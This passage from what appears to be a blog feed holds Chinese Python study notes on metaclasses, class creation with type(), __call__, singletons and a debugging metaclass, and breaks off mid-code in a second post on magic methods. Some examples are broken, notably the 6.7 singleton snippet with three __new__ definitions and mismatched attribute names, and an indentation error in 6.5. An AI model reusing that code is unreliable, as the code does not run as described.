    <content type="html"><![CDATA[<h1 id="元类【深入理解Python】"><a href="#元类【深入理解Python】" class="headerlink" title="元类【深入理解Python】"></a>元类【深入理解Python】</h1><h2 id="6-1-类也是对象"><a href="#6-1-类也是对象" class="headerlink" title="6.1 类也是对象"></a>6.1 类也是对象</h2><ul><li>元类是什么？要先了解类是什么？</li><li>Python是一切皆对象，哪怕你定义一个变量，它也是对象，那类是什么？ 类可以想象成是对象的模版，是类定义了对象，对象是类实例化的产物，</li><li>那类是对象的模板，什么是类的类（模版）呢？</li><li>元类就是类的类（模版）默认元类type</li><li>你可以自定义这个元类来实现有区别于类的类</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br><br>stu = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>)<span class="hljs-comment"># Student实例化得到对象 stu</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(stu))    <span class="hljs-comment"># type()函数可以得到 stu这个对象的类是Student </span><br><span class="hljs-built_in">print</span>(stu.__class__)<span class="hljs-comment"># 类似的方式 得到 stu这个对象的类是Student </span><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(Student))<span class="hljs-comment"># 类似的 通过type()的方式得到Student的类型是 type</span><br><span class="hljs-built_in">print</span>(Student.__class__)<span class="hljs-comment"># 类似的通过 __class__ 得到Student的类是 type</span><br><br><br><span class="hljs-comment"># 于是得到结论 类也是对象，类的类是type, 即type实例化得到的对象是类</span><br></code></pre></td></tr></table></figure><h2 id="6-2-class机制"><a href="#6-2-class机制" class="headerlink" title="6.2 class机制"></a>6.2 class机制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>        <br><span class="hljs-comment"># 类的三大特征：</span><br>- 类名：Student<br>- 基类们：<span class="hljs-built_in">object</span>,<br>- 名称空间：就是类下面对象的属性和方法，构成的一个字典 key是属性/方法名字符串，value是属性/方法本身<br></code></pre></td></tr></table></figure><p>class是python的一个关键字，目的是用来创建类，那这个关键字的背后是什么逻辑呢？</p><ul><li>第一步：<strong>获取类名</strong> class_name &#x3D; Student</li><li>第二步： <strong>获取基类们：</strong> class_bases&#x3D;(object,)</li><li>第三步：<strong>获取类的名称空间：</strong> class_dict &#x3D; {“–init–” ：–init–,”–talk–”:talk}</li><li>第四步：<strong>调用元类type实例化产生Student类这个对象</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>    self.name = name<br>    self.age = age<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br><br><br>class_name = <span class="hljs-string">&quot;Student&quot;</span><br>class_bases = (<span class="hljs-built_in">object</span>, )<br>class_dict = &#123;<span class="hljs-string">&quot;__init__&quot;</span>: __init__, <span class="hljs-string">&quot;talk&quot;</span>: talk&#125;  <span class="hljs-comment">#  字典</span><br><br><br>Student = <span class="hljs-built_in">type</span>(class_name, class_bases, class_dict)  <span class="hljs-comment"># 自定义了元类信息，Student是实例化对象</span><br><br>stu = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>)<br><span class="hljs-built_in">print</span>(stu.talk())<br></code></pre></td></tr></table></figure><ul><li>但是如果按照这四步走就比较繁琐，所以正常是用python的关键字class 来定义类的</li></ul><h2 id="6-3-自定义元类"><a href="#6-3-自定义元类" class="headerlink" title="6.3 自定义元类"></a>6.3 自定义元类</h2><p>上面我们知道了class的原理，那我们自定义元类，就是在做第四步的自定义，即使用不同的元类实例化这个对象，目的是为了按照需求控制类的定义和调用</p><p>metaclass&#x3D;type就是让他指向type元类，这是所有类的基石</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(metaclass=<span class="hljs-built_in">type</span>):<span class="hljs-comment"># class机制默认的元类是type：我们可以修改metaclass参数来选择自定义元类</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>type是一切类的基石，所以我们自定义的元类，也必须继承自<code>type</code></li><li>自定义的元类继承type的目的是使用type的大部分功能，我们只定制（重写方法）我们需要的那一部分功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mymeta</span>(<span class="hljs-title class_ inherited__">type</span>):<span class="hljs-comment"># 只有继承了type的类才能作为元类使用</span><br>    <span class="hljs-comment"># 在这个里面去重写type的方法去自定义自己的元类</span><br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(metaclass=Mymeta):<span class="hljs-comment"># 使用Mytema元类，即Mymeta(class_name, class_bases, class_dict)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="6-4-自定义元类控制类的定义"><a href="#6-4-自定义元类控制类的定义" class="headerlink" title="6.4 自定义元类控制类的定义"></a>6.4 自定义元类控制类的定义</h2><p>自定义元类定制类的时候，需要再自定义的元类中实现init()方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mymeta</span>(<span class="hljs-title class_ inherited__">type</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, class_name, class_bases, class_dict</span>):<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> class_name.istitle():<span class="hljs-comment"># 自定制需求 istitle()用于检查字符串的首字母是否大写，如果大写就是Ture，否则Flase</span><br>            <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&#x27;类名首字母必须大写&#x27;</span>)<br> <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__doc__:  <span class="hljs-comment"># # 如果类的__doc__属性是空，就抛出异常 doc就是注释那里</span><br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&#x27;类必须要有文档注释&#x27;</span>)<br><br>        <span class="hljs-built_in">super</span>().__init__(class_name, class_bases, class_dict)<br><br><br><span class="hljs-comment"># People = Mymeta(class_name, class_bases, class_dict),</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span>(<span class="hljs-built_in">object</span>, metaclass=Mymeta):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    deox</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    x = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><br><span class="hljs-built_in">print</span>(People.__dict__)<br></code></pre></td></tr></table></figure><h2 id="6-5实例化对象的本质是什么？"><a href="#6-5实例化对象的本质是什么？" class="headerlink" title="6.5实例化对象的本质是什么？"></a>6.5实例化对象的本质是什么？</h2><p>回顾一下，实例化一个对象时会发生什么？ </p><ul><li><strong>第一件事：创建了一个空对象，–new–方法</strong></li><li><strong>第二件事：初始化了这个空对象  –init–</strong></li><li><strong>最后：返回初始化完成的对象</strong><ul><li>new（）创建空对象，且返回这个空对象</li><li>init() 接收了这个空对象，并完成了初始化该对象</li><li>最后，返回初始化完成的对象。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>    self.name = name <br>stu = Student(<span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-number">18</span>)<br><br></code></pre></td></tr></table></figure><p>整个三步流程，是由类的类，即元类中的–call–()方法管理的（定义.类() ），因为实例化对象，类加括号，即类的调用。类被当一个对象看待时，直接以类方法调用，就会触发它的–call–()函数的执行，即实例化对象时，出发了元类的–call–()函数</p><p>在元类–call–()内实现实例化的三件事。</p><p>当我们默认使用的是type元类时，想要<strong>定制实例化的这个过程中</strong>的需求是无法实现的，因为我们无法修改内置元类type的–call–方法。</p><p>当我们使用自定义元类的时候，就可以实现<strong>实例化过程需求的自定义</strong>，因为我们可以重写自定义元类的–call–方法，从而实现自定义实例化需求</p><h2 id="6-6-自定义元类控制类的调用"><a href="#6-6-自定义元类控制类的调用" class="headerlink" title="6.6 自定义元类控制类的调用"></a>6.6 自定义元类控制类的调用</h2><p>类的调用： 就是类加括号，也就是实例化对象</p><p><strong>你实例化一个类的对象时，实际上会调用类的 <code>__call__</code> 方法（如果定义了的话）。这种行为使得类的实例可以像函数一样被调用。</strong></p><p>控制类的调用就是控制对象的额实例化过程。类的调用就会触发元类的<code>__call__</code> 方法执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mymeta</span>(<span class="hljs-title class_ inherited__">type</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">cls, *args, **kwargs</span>):<br>        <span class="hljs-comment"># 第一步: 调用Student下面的__new__创建一个空对象, 无则使用类(type)的__new__</span><br>        obj = cls.__new__(cls, *args, **kwargs)<br>        <span class="hljs-comment"># 第二步：调用Student下面的__init__初始化对象</span><br>        cls.__init__(obj, *args, **kwargs)        <span class="hljs-comment"># 等价于： obj.__init__(*args, **kwargs)</span><br>        <span class="hljs-comment"># 第三步：返回对象</span><br>        <span class="hljs-keyword">return</span> obj<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-built_in">object</span>, metaclass=Mymeta):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br><br>jack = Student(<span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-number">18</span>)   <span class="hljs-comment"># People.__call__(&#x27;jack&#x27;, 18)</span><br></code></pre></td></tr></table></figure><h2 id="6-7-通过new实现单例模式"><a href="#6-7-通过new实现单例模式" class="headerlink" title="6.7 通过new实现单例模式"></a>6.7 通过new实现单例模式</h2><p>回顾一下单例模式：</p><ul><li>一个类只实例化一个对象的一种编程思维，就是单例模式</li><li>怎么实现： 通过自定义–new–()魔法方法实现，判断类的实例化对象是否已经有了，有了就直接返回这个实例化对象，没有就可以new一个实例化并保存返回。看看对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    _instance = <span class="hljs-literal">None</span> <span class="hljs-comment"># 默认类的属性_instance是空</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls,*args, **kwargs</span>):<br>        self.name = name<br>        self.age = age<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls,*args, **kwargs</span>):  <br>        <span class="hljs-keyword">if</span> cls._instance:  <span class="hljs-comment"># 判断，如果cls._instance is Ture就是指判断他是否有实例</span><br>            <span class="hljs-keyword">return</span> cls._instance <span class="hljs-comment"># 如果有就直接返回这个实例</span><br>        <span class="hljs-keyword">else</span>:<br>            cls._instance = <span class="hljs-built_in">super</span>().__new__(cls)    <span class="hljs-comment"># 如果没有，就新建一个实例化对象</span><br>            <span class="hljs-keyword">return</span> cls._instance   <span class="hljs-comment"># 并且返回</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, *agrs, **kwagrs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cls._instance:<br>            cls._instances = <span class="hljs-built_in">super</span>().__new__(cls)  <span class="hljs-comment"># 如果没有，就新建一个</span><br>        <span class="hljs-keyword">return</span> cls.instances  <span class="hljs-comment"># 不管有没有实例化对象，都返回这个对象， 如果有就直接返回</span><br><br></code></pre></td></tr></table></figure><h2 id="6-8-通过元类来实现单例模式【重点】"><a href="#6-8-通过元类来实现单例模式【重点】" class="headerlink" title="6.8 通过元类来实现单例模式【重点】"></a>6.8 通过元类来实现单例模式【重点】</h2><p>思路是什么？</p><ul><li>首先，这个实现的点在哪里？在类的定义阶段就确保类的实例化行为符合单例模式，</li><li>呐你单例模式，是在定义类的时候做判断，通过类的–new–()方法里面去做判断，如果这个类有实例化对象，就返回这个对象，如果没有就新建一个对象返回，<ul><li>这里插一句，实例化的过程发生了什么？1、–new–新建一个空对象且返回出去给–init– 2、–init–接收这个空对象，进行初始化，就是slef.name&#x3D;name，3、将这个初始化过的对象返回去。就是调用类的‘爸爸’’元类的–call–方法，–call–就是.类()把类当方法用的方法</li></ul></li><li>好的，现在我们知道了实例化过程，那我们除了可以在new方法这里做判断，还可以在定义类的‘‘爸爸’’元类的时候去做判断</li><li>因为你在实例化的时候，就是调用了类的‘‘爸爸’’元类的–call–方法去实例化的（–call–把类当方法用）</li><li>好，现在我们知道了要去自定义元类的–call–方法，也就是在调用–call–的时候去做判断，判断这个类有没有实例化对象，如果有就直接返回这个对象，如果没有就新建一个对象然后再返回这个对象。</li><li>好我现在要再自定义的原来上面去做判断是吧，那怎么自定义元类？且看代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mymeta</span>(<span class="hljs-title class_ inherited__">type</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">cls, name,bases,dic</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,bases,dic)<br>        cls._instance = <span class="hljs-literal">None</span>   <span class="hljs-comment"># 将记录类的实例化对象的数据属性放在元类中自动定义了 这里和之前定义类的时候是一个意思</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">cls,*args, **kwargs</span>):  <span class="hljs-comment"># 此call会在类被调用（即实例化时出发）</span><br>        <span class="hljs-keyword">if</span> cls._instance:  <span class="hljs-comment"># 判断类有没有实例化对象</span><br>            <span class="hljs-keyword">return</span> cls._instance <span class="hljs-comment"># 如果有就返回这个实例化对象啊</span><br>        <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 如果没有</span><br>            obj = cls.__new__(cls, *args, **kwargs) <span class="hljs-comment"># 那就控制类造一个空对象并完成初始化</span><br>            obj.__init__(*args,**kwargs) <span class="hljs-comment">#  那就控制类造一个空对象并完成初始化</span><br>            cls._instance = obj <span class="hljs-comment"># 保存这个对象，那cls的_instance是这个对象，下一次再实例化的时候就直接返回而不用再造对象</span><br>            <span class="hljs-keyword">return</span> obj <span class="hljs-comment"># 返回这个对象</span><br>        <br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(metaclass=Mymeta):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>        <br>        <br>stu1 = Student(<span class="hljs-string">&quot;jone&quot;</span>,<span class="hljs-number">18</span>)<br>stu2 = Student(<span class="hljs-string">&#x27;xiaoming&#x27;</span>,<span class="hljs-number">19</span>)<br><span class="hljs-built_in">print</span>(stu1 <span class="hljs-keyword">is</span> stu2)<br><span class="hljs-built_in">print</span>(stu1.__dict__,stu2.__dict__)<br></code></pre></td></tr></table></figure><p>原理解读：类定义时会调用元类下面的–init–(),类调用（实例化对象）时会触发元类下的–call–方法</p><p>类在定义时，给类新增一个空的数据属性，</p><p>第一次实例化的时候，实例化之后就会将这个对象赋值给类的数据属性； # 所以第一次实例化的时候，就获得了这个属性</p><p>第二次再实例化的时候，直接返回类的这个数据属性</p><p>和自定类的时候单例不同的是，类的这1个数据属性是放在元类中自动定义的，而不是在类中显示的定义的</p><p>类调用时，出发元类–call–方法判断是否有实例化对象，而不是在类的绑定方法中做判断。</p><p>最后我说一句，其实两个的原理是一样的，</p><ul><li>你使用定义类的方式：你在类中做了判断，其实就是你是在实例化对象的‘‘爸爸’’定义类中的–new–也就是新建对象的时候做的判断，</li><li>你使用自定义元类的方式，也就是你在定义类的‘‘爸爸’’元类的–call–方法做的判断，因为类实例化对象就是调用的元类的–call–方法</li><li><strong>那二者的区别？</strong><ul><li>你全局只有一个类的单例，那你就在定义类的时候做下判断就好，那如果你的程序要定义好几个只能单例的类的？不可能每个类你都去重写–new–方法吧？ 这个时候你就可以重写（自定义）元类去实现呀，。这样你每个定义类只需要继承自定义元类就行。</li></ul></li></ul><p>拓展一下，场景：</p><ol><li><strong>验证和数据处理：</strong> 你可以通过自定义元类来验证类的属性和方法是否符合某些规则。例如，你可以创建一个元类，确保所有的属性都是特定类型，或者属性的值满足某些条件。</li><li><strong>日志和调试： 自定义元类可以用来自动添加日志、跟踪或调试信息到类的方法中，从而帮助你更好地理解代码的执行过程。</strong></li><li><strong>ORM（对象关系映射）：</strong> 自定义元类可以用于创建 ORM 框架中的数据库模型，将 Python 类映射到数据库表，从而实现数据的存储和检索。</li><li><strong>API 定义：</strong> 通过自定义元类，你可以创建领域特定语言（DSL）的类，从而提供更高级别的 API 接口，以适应特定的业务需求。</li><li><strong>依赖注入：</strong> 自定义元类可以用于自动注入依赖项，从而简化类的构造过程。</li><li><strong>单元测试辅助：</strong> 自定义元类可以用于在测试中自动生成 Mock 对象，帮助进行单元测试。</li><li><strong>实现属性访问控制：</strong> 通过自定义元类，你可以控制类的属性访问权限，从而实现公开、私有和受保护的属性。</li><li><strong>插件系统：</strong> 自定义元类可以用于创建可插拔的插件系统，允许你动态地扩展类的功能。</li></ol><p><strong>日志和调试：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DebugMeta</span>(<span class="hljs-title class_ inherited__">type</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, name, bases, cls_dict</span>):<br>        <span class="hljs-keyword">for</span> attr_name, attr_value <span class="hljs-keyword">in</span> cls_dict.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">callable</span>(attr_value):  <span class="hljs-comment"># 检查属性是否是可调用的（方法）</span><br>                cls_dict[attr_name] = cls.debug_decorator(attr_value)  <span class="hljs-comment"># 使用装饰器替换方法</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().__new__(cls, name, bases, cls_dict)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">debug_decorator</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Calling <span class="hljs-subst">&#123;func.__name__&#125;</span> with args: <span class="hljs-subst">&#123;args&#125;</span>, kwargs: <span class="hljs-subst">&#123;kwargs&#125;</span>&quot;</span>)<br>            result = func(*args, **kwargs)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;func.__name__&#125;</span> returned: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DebugClass</span>(metaclass=DebugMeta):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> a + b<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">subtract</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> a - b<br><br><span class="hljs-comment"># 使用</span><br>debug_instance = DebugClass()<br>result = debug_instance.add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><ul><li>自定义元类的new方法，<ul><li>自定义一个装饰器，就是被装饰的方法运行前打印方法名称和入参之类的，方法结束的时候打印一下return值</li><li>在new方法里写，遍历后判断类的属性是否可调用 if callable(属性名):如果可以调用就使用装饰器装饰一下这个方法 打印日志</li><li>然后再定义类的时候继承这个自定义元类。</li></ul></li></ul><p><strong>验证和数据处理</strong></p><ul><li>就是自定义元类new方法，在里面做判断，如果类你定义的类的属性符合某个要求，就没事，如果不如何对应的要求，就会抛出异常报错</li><li>然后你在定义类的时候，指定元类</li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之魔法方法（五）</title>
    <link href="/2024/03/18/605python%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2024/03/18/605python%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="5-魔法方法"><a href="#5-魔法方法" class="headerlink" title="5 魔法方法"></a>5 魔法方法</h1><h2 id="5-1init-和-del-【重点】"><a href="#5-1init-和-del-【重点】" class="headerlink" title="5-1init 和 del 【重点】"></a>5-1init 和 del 【重点】</h2><ul><li>为什么叫魔法方法？ 只有在某种条件下才触发，就像魔法一样</li><li><code> __init__</code> ：当你定义的类，被实例化的时候，自动执行，给对象初始化属性，这个方法里面放self.xxx属性&#x3D;xxx<br>然后这个xxx由init方法入参，所以你在实例化对象的时候，就需要传这个参数进去，这个参数就是对象的属性</li><li>这个<code> __init__</code> 默认是返回None的，默认不写</li><li>这里要说一下<code>__del__</code>析构方法，当对象被回收的时候出发执行(程序结束、对象引用技术为0称为垃圾时)<br>这里要回想下python的垃圾回收机制的一种“引用计数”，就是当引用计数为0的时候，会被定义为垃圾，会被回收</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init...&quot;</span>)<br>        self.name = name<br>        self.age = age<br>        <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># return 123# 注意：方法必须返回None，默认不写return语句</span><br>        <br><span class="hljs-comment"># 析构</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;del...&quot;</span>)<br><br><br>stu1 = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">19</span>)<br><span class="hljs-keyword">del</span> stu1<span class="hljs-comment"># 触发执行 __del__</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-built_in">print</span>(<span 